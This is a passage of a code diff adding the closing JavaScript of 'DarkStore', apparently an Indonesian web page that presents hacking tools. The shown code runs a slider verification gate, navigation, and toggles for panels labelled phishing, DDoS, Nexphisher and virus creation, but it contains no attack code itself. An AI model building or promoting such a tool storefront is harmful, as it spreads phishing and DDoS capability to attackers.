+            successBox.style.display = 'none';
+        }
+    }
+
+    function endDrag() {
+        isDragging = false;
+        let left = parseFloat(slider.style.left) || 4;
+        currentLeft = Math.min(Math.max(left, 4), maxLeft);
+        if (currentLeft >= maxLeft - 5) {
+            currentLeft = maxLeft;
+            slider.style.left = maxLeft + 'px';
+            progress.style.width = '100%';
+            btnVerify.disabled = false;
+            btnVerify.classList.add('active');
+            successBox.style.display = 'block';
+            sliderText.innerHTML = '<i class="fas fa-check" style="color:#00ccaa;"></i> Terverifikasi';
+            sliderText.style.color = '#00ccaa';
+        }
+    }
+
+    btnVerify.addEventListener('click', function() {
+        if (this.classList.contains('active')) {
+            verifyCard.style.display = 'none';
+            darkstoreApp.classList.add('show');
+            document.body.style.background = '#0a0a0a';
+            document.body.style.alignItems = 'flex-start';
+            document.body.style.padding = '20px';
+        }
+    });
+
+    // ===== LOGO = POPUP =====
+    const logo = document.getElementById('logoEqual');
+    const popup = document.getElementById('popupEqual');
+    logo.addEventListener('click', e => { e.stopPropagation(); popup.classList.toggle('show'); });
+    document.addEventListener('click', e => { if (!popup.contains(e.target) && e.target !== logo) popup.classList.remove('show'); });
+
+    // ===== NAV =====
+    document.querySelectorAll('.nav-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
+            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+            document.getElementById('page-' + this.dataset.page).style.display = 'block';
+        });
+    });
+
+    // ===== TOOLS =====
+    document.getElementById('toolPrank').onclick = function() {
+        document.getElementById('detailPrank').classList.toggle('show');
+        document.getElementById('detailPhising').classList.remove('show');
+        document.getElementById('detailDdos').classList.remove('show');
+        document.getElementById('detailNexphisher').classList.remove('show');
+        document.getElementById('detailCreaterVirus').classList.remove('show');
+    };
+    document.getElementById('toolPhising').onclick = function() {
+        document.getElementById('detailPhising').classList.toggle('show');
+        document.getElementById('detailPrank').classList.remove('show');
+        document.getElementById('detailDdos').classList.remove('show');
+        document.getElementById('detailNexphisher').classList.remove('show');
+        document.getElementById('detailCreaterVirus').classList.remove('show');
+    };
+    document.getElementById('toolDdos').onclick = function() {
+        document.getElementById('detailDdos').classList.toggle('show');
+        document.getElementById('detailPrank').classList.remove('show');
+        document.getElementById('detailPhising').classList.remove('show');
+        document.getElementById('detailNexphisher').classList.remove('show');
+        document.getElementById('detailCreaterVirus').classList.remove('show');
+    };
+    document.getElementById('toolNexphisher').onclick = function() {
+        document.getElementById('detailNexphisher').classList.toggle('show');
+        document.getElementById('detailPrank').classList.remove('show');
+        document.getElementById('detailPhising').classList.remove('show');
+        document.getElementById('detailDdos').classList.remove('show');
+        document.getElementById('detailCreaterVirus').classList.remove('show');
+    };
+    document.getElementById('toolCreaterVirus').onclick = function() {
+        document.getElementById('detailCreaterVirus').classList.toggle('show');
+        document.getElementById('detailPrank').classList.remove('show');
+        document.getElementById('detailPhising').classList.remove('show');
+        document.getElementById('detailDdos').classList.remove('show');
+        document.getElementById('detailNexphisher').classList.remove('show');
+    };
+
+    console.log('DarkStore siap - Teks peringatan merah ditambahkan.');
+</script>
+</body>
+</html>
+```
